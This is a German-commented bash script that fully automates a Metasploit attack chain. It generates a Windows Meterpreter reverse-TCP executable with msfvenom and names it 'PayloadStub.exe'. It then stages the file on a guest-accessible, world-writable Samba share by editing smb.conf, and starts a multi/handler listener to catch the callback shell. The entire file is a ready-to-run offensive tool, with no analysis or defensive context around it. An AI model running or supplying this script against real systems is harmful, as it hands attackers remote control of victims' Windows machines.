#!/bin/bash

# Autor: 81a5terfr34k
# Zweck: Payload + SMB-Share einrichten + Listener starten

# ---------------------------
# 🔹 Benutzerabfrage
# ---------------------------
read -p "Bitte gib die IP-Adresse deines Kali-Systems ein (LHOST): " LHOST
if [[ -z "$LHOST" ]]; then
  echo "[!] Keine IP-Adresse eingegeben – Abbruch."
  exit 1
fi

# ---------------------------
# 🔹 Konfiguration
# ---------------------------
PAYLOAD="windows/meterpreter/reverse_tcp"
LPORT=4444
OUTPUT="PayloadStub.exe"
PAYLOAD_SRC=~/Schreibtisch/$OUTPUT
SMB_DIR="/srv/smbshare"
RC_FILE="listener.rc"
SMB_CONF="/etc/samba/smb.conf"
SMB_BACKUP="/etc/samba/smb.conf.bak_$(date +%F_%H%M%S)"

echo "[*] Verwende LHOST: $LHOST"

# ---------------------------
# 🔹 Payload erzeugen
# ---------------------------
echo "[*] Erstelle Payload..."
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f exe -o $PAYLOAD_SRC || {
  echo "[!] Fehler beim Erzeugen des Payloads"
  exit 1
}
echo "[+] Payload gespeichert unter $PAYLOAD_SRC"

# ---------------------------
# 🔹 SMB-Freigabe einrichten
# ---------------------------
echo "[*] SMB-Verzeichnis erstellen: $SMB_DIR"
sudo mkdir -p $SMB_DIR
sudo chmod -R 777 $SMB_DIR

echo "[*] Payload in SMB-Verzeichnis verschieben..."
sudo mv $PAYLOAD_SRC $SMB_DIR/ || {
  echo "[!] Fehler beim Verschieben"
  exit 1
}

echo "[*] Kontrolliere Dateien in $SMB_DIR:"
ls -l $SMB_DIR

# ---------------------------
# 🔹 Samba konfigurieren
# ---------------------------
echo "[*] Backup der smb.conf erstellen..."
sudo cp $SMB_CONF $SMB_BACKUP

echo "[*] Bearbeite smb.conf..."

# Ergänze "map to guest" in [global], falls nicht vorhanden
if ! grep -q "map to guest" $SMB_CONF; then
  sudo sed -i '/^\[global\]/a map to guest = Bad User' $SMB_CONF
fi

# Share-Block nur ergänzen, wenn nicht vorhanden
if ! grep -q "\[share\]" $SMB_CONF; then
  cat <<EOF | sudo tee -a $SMB_CONF > /dev/null

[share]
   path = $SMB_DIR
   browsable = yes
   read only = no
   guest ok = yes
EOF
fi

# ---------------------------
# 🔹 SMB-Dienst neu starten
# ---------------------------
echo "[*] Starte Samba neu..."
sudo systemctl restart smbd

# ---------------------------
# 🔹 Test: Zugriff auf SMB-Share
# ---------------------------
echo "[*] Teste SMB-Zugriff mit smbclient:"
smbclient //localhost/share -N || {
  echo "[!] SMB-Zugriff fehlgeschlagen"
}

# ---------------------------
# 🔹 RC-Datei + Listener starten
# ---------------------------
echo "[*] Erstelle RC-Datei für Metasploit..."

cat > $RC_FILE <<EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
EOF

echo "[+] RC-Datei erstellt: $RC_FILE"
echo "[*] Starte msfconsole..."

msfconsole -r $RC_FILE
